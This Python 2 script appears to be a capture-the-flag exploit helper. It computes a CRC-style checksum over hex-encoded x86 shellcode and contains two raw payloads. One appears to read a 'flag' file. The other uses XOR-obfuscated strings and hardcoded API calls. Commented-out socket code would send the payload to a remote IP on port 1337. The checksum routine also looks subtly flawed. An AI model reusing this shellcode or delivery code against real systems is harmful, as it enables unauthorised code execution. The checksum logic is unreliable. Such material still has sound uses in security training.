import socket
import time
from struct import*


def reverse_bits(num, bit_size): 
  
    # convert number into binary representation 
    # output will be like bin(10) = '0b10101' 
    binary = bin(num) 
    # print(binary)

    # skip first two characters of binary 
    # representation string and reverse 
    # remaining string and then append zeros 
    # after it. binary[-1:1:-1]  --> start 
    # from last character and reverse it until 
    # second last character from left 
    reverse = binary[-1:1:-1] 
    reverse = reverse + (bit_size - len(reverse))*'0'

    # converts reversed binary string into integer 
    reversed_num = int(reverse,2) 

    # print(bin(reversed_num))
    return reversed_num

def calc_checksum(shellcode):
    hex_bytes = shellcode.decode("hex")

    while len(hex_bytes) % 4 != 0: hex_bytes += '\x00'

    checksum = 0xffffffff

    for i in range(0, len(hex_bytes), 4):
        number = unpack('I', hex_bytes[i:i+4])[0]

        
        reversed_number = reverse_bits(number, 32)

        for j in range(8):
            if reversed_number ^ checksum == 0:
                checksum <<= 1
                checksum &= 0xFFFFFFFF
                
            else:
                checksum <<= 1
                checksum &= 0xFFFFFFFF

                checksum ^= 0x4C11DB7
            # break

        reversed_number <<= 1
        reversed_number &= 0xFFFFFFFF

        # break            
    print(hex(checksum))




if __name__=='__main__':

    # shellcode = "31c031db31c931d2eb325bb00531c9cd8089c6eb06b00131dbcd8089f3b00383ec018d0c24b201cd8031db39c374e6b004b301b201cd8083c401ebdfe8c9ffffff666c6167"
    shellcode = "31c050684141652258c1e808c1e80850b834470b4dbb5d696e3531d850b843321022bb796e514e31d850b860054232bb4978797131d850b80f1c2c14bb6a64493331d850b8073e0b40bb4652626e31d850b8440a7807bb6349425b31d850b80f164b0dbb6a31672d31d850b818625c1fbb614c396731d850b81b2d1e1fbb6b586a6b31d850b845404166bb3d78774931d850b8021f4b45bb6d6b386a31d850b8243e1932bb454e6a5a31d850b8005e3a35bb6c73495b31d850b81f374024bb6d52324131d850b82e356831bb5a4c454131d850b8481e1c15bb676e696131d850b826280d5dbb4f45623331d850b820571d45bb4778633631d850b8046a243bbb77444b4931d850b8180f0a32bb6c6e784731d850b87d183c27bb526c5d5531d850b803446060bb77345a4f31d850b8476b1f20bb6f4c775431d850b82a5e2b20bb6c37474531d850b85907120ebb3568736a31d850b80159112cbb4536664231d850b822224e5abb4c56677431d850b800371b48bb435b722d31d850b84a1f2213bb6448477131d850b86a230318bb4a6d666c31d850b82d54571cbb4731346831d850b84e15365abb3938793831d850b8597f1f04bb7957516131d850b847561d2fbb65703d5431d850b82c180854bb4d766c7431d850b85a34581bbb395b357631d850b83f0f4b41bb53636b6c31d850b84a1e590bbb386d316e31d850b8492b162abb3944614f31d85089e0bb41414101c1eb08c1eb08c1eb085350bb95e6b177ffd3bbcf2aae77ffd3"
    calc_checksum(shellcode)

    # host = "18.196.92.84"
    # port = 1337

    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # s.connect((host, port))
    
    # time.sleep(1)    
    # buffer = s.recv(1024)
    # print(buffer)
    
    # s.send(shellcode + "\n")

    # time.sleep(1)    
    # buffer = s.recv(1024)
    # print(buffer)
    # time.sleep(1)    
    # buffer = s.recv(1024)
    # print(buffer)
    # time.sleep(1)    
    # buffer = s.recv(1024)
    # print(buffer)

